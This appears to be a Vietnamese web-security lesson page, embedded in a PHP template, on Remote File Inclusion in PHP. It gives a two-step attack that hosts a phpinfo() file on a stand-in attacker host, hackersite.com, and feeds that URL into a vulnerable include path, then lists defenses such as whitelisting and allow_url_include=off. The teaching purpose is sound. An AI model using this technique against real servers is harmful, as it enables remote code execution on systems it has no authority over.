<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-fi/rfi" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Lỗ Hổng Remote File Inclusion (RFI)
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <p>Như bạn đã biết, cơ chế <strong>include</strong> code của PHP, cho phép bạn cung cấp đường dẫn dưới dạng URL. Tức là bạn có thể thực hiện:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">'http://localhost/upload/test.txt'</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h1 id="Remote-File-Inclusion-RFI"><a href="#Remote-File-Inclusion-RFI" class="headerlink" title="Remote File Inclusion (RFI)"></a>Remote File Inclusion (RFI)</h1>
                <p><strong>Remote File Inclusion</strong> xảy ra khi kẻ tấn công có thể control được địa chỉ dưới dạng URL này nhằm mục đích chèn vào các đoạn script mã độc thực hiện các hành vi trái phép.<br>Nếu đoạn code cho ta control được toàn bộ cả địa chỉ nhập vào để include thì đó vừa là lỗ hổng LFI, vừa là lỗ hổng RFI.<br>Để đặc trưng hơn cho việc RFI, thường là ta chỉ có thể control được đoạn đầu của địa chỉ, còn đoạn sau của địa chỉ sẽ được cộng thêm một chuỗi string định sẵn.</p>
                <h1 id="Vi-du"><a href="#Vi-du" class="headerlink" title="Ví dụ"></a>Ví dụ</h1>
                <p>Nhìn sang ví dụ bên cạnh, ta thấy phần <strong>path</strong> của người dùng nhập vào được làm tham số cho đầu vào của hàm include(), nhưng không may phần code có cộng thêm phần ‘/config.php’.<br>Tức là nếu ta nhập vào:</p>
                <blockquote>
                    <p>path=/home/config</p>
                </blockquote>
                <p>Vậy file được include vào sẽ là: /home/config/config.php</p>
                <p>Do ta không thể upload 1 file có tên là config.php lên rồi chỉnh sửa <strong>path</strong> sao cho đúng với file vừa upload lên. Mà nếu upload lên được file php thì cần gì FI nữa. :)))</p>
                <p>Do đó, ta sẽ dùng RFI để tấn công như sau.</p>
                <h2 id="Y-tuong"><a href="#Y-tuong" class="headerlink" title="Ý tưởng:"></a>Ý tưởng:</h2>
                <p>Ta sẽ cung cấp địa chỉ phía trước là: <a href="http://hackersite.com/upload" target="_blank" rel="noopener">http://hackersite.com/upload</a><br>Để file được include vào không phải nằm trên server nạn nhân nữa, mà là nằm trên thư mục upload của server chúng ta.</p>
                <h2 id="Buoc-1-Tao-file-config-php-tren-server-rieng"><a href="#Buoc-1-Tao-file-config-php-tren-server-rieng" class="headerlink" title="Bước 1: Tạo file config.php trên server riêng."></a>Bước 1: Tạo file config.php trên server riêng.</h2>
                <p>Tạo file config.php với nội dung cơ bản như sau:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Đặt tại thư mục upload/ của server. Thì đường dẫn tới file config.php này sẽ là:</p>
                <blockquote>
                    <p><a href="http://hackersite.com/upload/config.php" target="_blank" rel="noopener">http://hackersite.com/upload/config.php</a></p>
                </blockquote>
                <h2 id="Buoc-2-Cung-cap-URL-vao-bien-path"><a href="#Buoc-2-Cung-cap-URL-vao-bien-path" class="headerlink" title="Bước 2: Cung cấp URL vào biến path"></a>Bước 2: Cung cấp URL vào biến path</h2>
                <p>Nhập vào path:</p>
                <blockquote>
                    <p><a href="http://hackersite.com/upload" target="_blank" rel="noopener">http://hackersite.com/upload</a></p>
                </blockquote>
                <p>Khi cộng thêm với đoạn ‘/config.php’ thì nó sẽ là đường dẫn tới file mã độc của chúng ta đang đợi sẵn.</p>
                <h2 id="Thanh-cong-Co-the-thu-voi-http-localhost"><a href="#Thanh-cong-Co-the-thu-voi-http-localhost" class="headerlink" title="Thành công! Có thể thử với http://localhost"></a>Thành công! Có thể thử với <a href="http://localhost">http://localhost</a></h2>
                <h1 id="Cach-phong-chong-RFI"><a href="#Cach-phong-chong-RFI" class="headerlink" title="Cách phòng chống RFI"></a>Cách phòng chống RFI</h1>
                <h2 id="Trong-code"><a href="#Trong-code" class="headerlink" title="Trong code"></a>Trong code</h2>
                <ul>
                    <li>Lời khuyên tốt nhất cho nhà phát triển là không nên cho phép include file động bằng user input. </li>
                    <li>Nếu không thể không dùng, hãy khai báo một <strong>whitelist</strong> những file có thể include vào để cho kẻ tấn công không thể nào bypass và điều khiển nó.</li>
                </ul>
                <h2 id="Config-php-ini"><a href="#Config-php-ini" class="headerlink" title="Config php.ini"></a>Config php.ini</h2>
                <p>Cấu hình trong php.ini:</p>
                <ul>
                    <li>allow_url_include = off </li>
                </ul>
                <p>Điều này sẽ ngăn việc include bằng URL.</p>
                <h1 id="Tham-Khao-Them"><a href="#Tham-Khao-Them" class="headerlink" title="Tham Khảo Thêm"></a>Tham Khảo Thêm</h1>
                <ul>
                    <li><strong>NETSPARKER</strong>: <a href="https://www.netsparker.com/blog/web-security/remote-file-inclusion-vulnerability/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/remote-file-inclusion-vulnerability/</a></li>
                    <li><strong>ACUNETIX</strong>: <a href="https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/</a></li>
                    <li><strong>OWASP</strong>: <a href="https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion" target="_blank" rel="noopener">https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion</a></li>
                </ul>
            </div>
        </article>
        <?php if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){change_status($id_post);}}
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>